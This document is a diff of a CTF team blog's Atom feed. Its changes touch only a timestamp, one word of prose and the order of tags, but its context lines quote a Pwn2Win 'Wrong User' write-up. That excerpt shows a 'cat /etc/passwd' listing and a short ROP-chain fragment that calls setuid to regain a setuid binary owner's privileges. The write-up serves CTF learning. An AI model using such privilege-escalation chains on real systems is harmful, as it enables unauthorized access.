@@ -85,7 +85,7 @@ array_upper(xpath (<span class="string">'row'</span>, query_to_xml (<span class=
     <link href="https://teamrocketist.github.io/2017/10/23/Pwn-Pwn2Win-Wrong-User/"/>
     <id>https://teamrocketist.github.io/2017/10/23/Pwn-Pwn2Win-Wrong-User/</id>
     <published>2017-10-23T08:31:07.000Z</published>
-    <updated>2017-10-26T15:47:41.868Z</updated>
+    <updated>2017-10-26T16:01:13.858Z</updated>
     
     <content type="html"><![CDATA[<blockquote><br>Wrong User<br><br>Molly invaded an important system of Bloodsuckers and obtained sensitive information. She believes that you are also capable of invading such system and therefore she left a secret message to you. Can you get such message? Maybe you get troubles to get access with the correct user.<br><br>Server: nc 10.133.70.1 6666<br><br><a href="https://cloud.ufscar.br:8080/v1/AUTH_c93b694078064b4f81afd2266a502511/static.pwn2win.party/wronguser_1e8787242eb826005729b0ba17a925b0782be65190f18a1b8dc4e57756c4e3c4.tar.gz" target="_blank" rel="external">https://cloud.ufscar.br:8080/v1/AUTH_c93b694078064b4f81afd2266a502511/static.pwn2win.party/wronguser_1e8787242eb826005729b0ba17a925b0782be65190f18a1b8dc4e57756c4e3c4.tar.gz</a><br><br><a href="https://static.pwn2win.party/wronguser_1e8787242eb826005729b0ba17a925b0782be65190f18a1b8dc4e57756c4e3c4.tar.gz" target="_blank" rel="external">https://static.pwn2win.party/wronguser_1e8787242eb826005729b0ba17a925b0782be65190f18a1b8dc4e57756c4e3c4.tar.gz</a><br><br>Id: wrong_user<br><br>Total solves: 8<br><br>Score: 373<br><br>Categories: Exploitation<br></blockquote>
 
@@ -112,7 +112,7 @@ array_upper(xpath (<span class="string">'row'</span>, query_to_xml (<span class=
 <p>So what’s wrong here? We don’t have access to the flag.txt, and happens we got access to the wrong user, there are some problems here, one of them is that in the beginning of the program we can see it’s being run <strong>setuid(getuid())</strong> :<br><a data-fancybox="gallery" href="https://i.imgur.com/pu2OY09.png" target="_blank" rel="external"></a></p>
 <p><img src="https://i.imgur.com/pu2OY09.png" alt=""><br><br>This will drop permissions from the as we can see when we did <strong>ls -lta</strong> the executable has the <strong>setuid</strong> enabled:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-rwsr-x--- 1 molly wrong-user 7704 Aug 31 22:27 wrong</div></pre></td></tr></table></figure></p>
 <p>Translating this a little bit:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">OWNER:                                                         Group</div><div class="line">-rws                                                           r-x                               </div><div class="line">||||---&gt; Execute and setuid bit (both enabled).                |||</div><div class="line">|||---&gt; Write Permissions(enabled)                             || \--&gt; Executable permissions (Enabled)</div><div class="line">| \---&gt; Read permissions(enabled)                              | \--&gt; Write Permissions (Disabled)</div><div class="line"> \---&gt; If it&apos;s a directory(disabled)                            \---&gt; Read Permissions (Enabled)</div><div class="line"></div><div class="line">World:</div><div class="line">---</div><div class="line">|||</div><div class="line">|| \---&gt; Executable permissions (Disabled)</div><div class="line">| \---&gt; Write Permissions (Disabled)</div><div class="line"> \---&gt; Read Permissions (Disabled)</div></pre></td></tr></table></figure></p>
-<p>When the <strong>setuid</strong> is enabled the process will run with <strong>owner</strong>, but there are some issues that are dropping privileges, the <strong>setuid(getuid())</strong> is one of them this is simple to solve we just need to create a ropchain that calls <strong>setuid(molly_uid)</strong> first we need to find <strong>molly’s uid</strong> this is easy we can check <strong>/etc/passwd</strong> :</p>
+<p>When the <strong>setuid</strong> is enabled the process will run with <strong>owner</strong> permissions, but there are some issues that are dropping privileges, the <strong>setuid(getuid())</strong> is one of them this is simple to solve we just need to create a ropchain that calls <strong>setuid(molly_uid)</strong> first we need to find <strong>molly’s uid</strong> this is easy we can check <strong>/etc/passwd</strong> :</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">$ cat /etc/passwd</div><div class="line">root:x:0:0:root:/root:/bin/bash</div><div class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</div><div class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</div><div class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</div><div class="line">sync:x:4:65534:sync:/bin:/bin/sync</div><div class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</div><div class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</div><div class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</div><div class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</div><div class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</div><div class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</div><div class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</div><div class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</div><div class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</div><div class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</div><div class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</div><div class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</div><div class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</div><div class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/<span class="literal">false</span></div><div class="line">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/<span class="literal">false</span></div><div class="line">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/<span class="literal">false</span></div><div class="line">systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/<span class="literal">false</span></div><div class="line">syslog:x:104:108::/home/syslog:/bin/<span class="literal">false</span></div><div class="line">_apt:x:105:65534::/nonexistent:/bin/<span class="literal">false</span></div><div class="line">lxd:x:106:65534::/var/lib/lxd/:/bin/<span class="literal">false</span></div><div class="line">messagebus:x:107:111::/var/run/dbus:/bin/<span class="literal">false</span></div><div class="line">uuidd:x:108:112::/run/uuidd:/bin/<span class="literal">false</span></div><div class="line">dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/<span class="literal">false</span></div><div class="line">sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin</div><div class="line">pollinate:x:111:1::/var/cache/pollinate:/bin/<span class="literal">false</span></div><div class="line">ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash</div><div class="line">wrong-user:x:1001:1001:,,,:/home/wrong-user:/bin/bash</div><div class="line">molly:x:1337:1337:,,,:/home/molly:/bin/bash</div><div class="line"><span class="keyword">case</span>:x:1002:1002:,,,:/home/<span class="keyword">case</span>:/bin/bash</div></pre></td></tr></table></figure>
 <p>Molly’s uid is <strong>1337</strong> writing a ropchain is trivial, we can do it like this:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">SETUID = LIBCBASE + libc.symbols[<span class="string">'setuid'</span>]</div><div class="line"></div><div class="line">ropchain += p64(POPRET) <span class="comment"># POP RDI RET</span></div><div class="line">ropchain += p64(<span class="number">1337</span>) <span class="comment"># 1337 ARG[1]</span></div><div class="line">ropchain += p64(SETUID) <span class="comment"># SETUID function "call"</span></div></pre></td></tr></table></figure>
@@ -144,9 +144,9 @@ array_upper(xpath (<span class="string">'row'</span>, query_to_xml (<span class=
       <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
     
     
-      <category term="rop" scheme="https://teamrocketist.github.io/tags/rop/"/>
-    
       <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
+    
+      <category term="rop" scheme="https://teamrocketist.github.io/tags/rop/"/>
     
       <category term="ret2libc" scheme="https://teamrocketist.github.io/tags/ret2libc/"/>
     
@@ -195,9 +195,9 @@ array_upper(xpath (<span class="string">'row'</span>, query_to_xml (<span class=
     
       <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
     
-      <category term="index" scheme="https://teamrocketist.github.io/tags/index/"/>
-    
       <category term="pwn2winctf" scheme="https://teamrocketist.github.io/tags/pwn2winctf/"/>
+    
+      <category term="index" scheme="https://teamrocketist.github.io/tags/index/"/>
     
   </entry>
   
@@ -404,11 +404,11 @@ d = []
     
       <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
     
-      <category term="pwn2winctf" scheme="https://teamrocketist.github.io/tags/pwn2winctf/"/>
-    
       <category term="sandbox" scheme="https://teamrocketist.github.io/tags/sandbox/"/>
     
       <category term="regex" scheme="https://teamrocketist.github.io/tags/regex/"/>
+    
+      <category term="pwn2winctf" scheme="https://teamrocketist.github.io/tags/pwn2winctf/"/>
     
   </entry>
   
@@ -661,15 +661,15 @@ d = []
       <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
     
     
+      <category term="backdoorctf" scheme="https://teamrocketist.github.io/tags/backdoorctf/"/>
+    
+      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
+    
       <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
     
       <category term="ROP" scheme="https://teamrocketist.github.io/tags/ROP/"/>
     
       <category term="retToLibc" scheme="https://teamrocketist.github.io/tags/retToLibc/"/>
-    
-      <category term="backdoorctf" scheme="https://teamrocketist.github.io/tags/backdoorctf/"/>
-    
-      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
     
   </entry>
   
@@ -798,11 +798,11 @@ d = []
     
       <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
     
+      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
+    
       <category term="stackcanary" scheme="https://teamrocketist.github.io/tags/stackcanary/"/>
     
       <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
-    
-      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
     
   </entry>
   
@@ -839,9 +839,9 @@ d = []
     
       <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
     
-      <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
-    
       <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
+    
+      <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
     
       <category term="shellcode" scheme="https://teamrocketist.github.io/tags/shellcode/"/>
     
@@ -886,11 +886,11 @@ d = []
     
       <category term="crypto" scheme="https://teamrocketist.github.io/tags/crypto/"/>
     
+      <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
+    
       <category term="aes" scheme="https://teamrocketist.github.io/tags/aes/"/>
     
       <category term="ecb" scheme="https://teamrocketist.github.io/tags/ecb/"/>
-    
-      <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
     
   </entry>
   
@@ -928,9 +928,9 @@ d = []
     
       <category term="crypto" scheme="https://teamrocketist.github.io/tags/crypto/"/>
     
-      <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
-    
       <category term="xor" scheme="https://teamrocketist.github.io/tags/xor/"/>
+    
+      <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
     
   </entry>
   
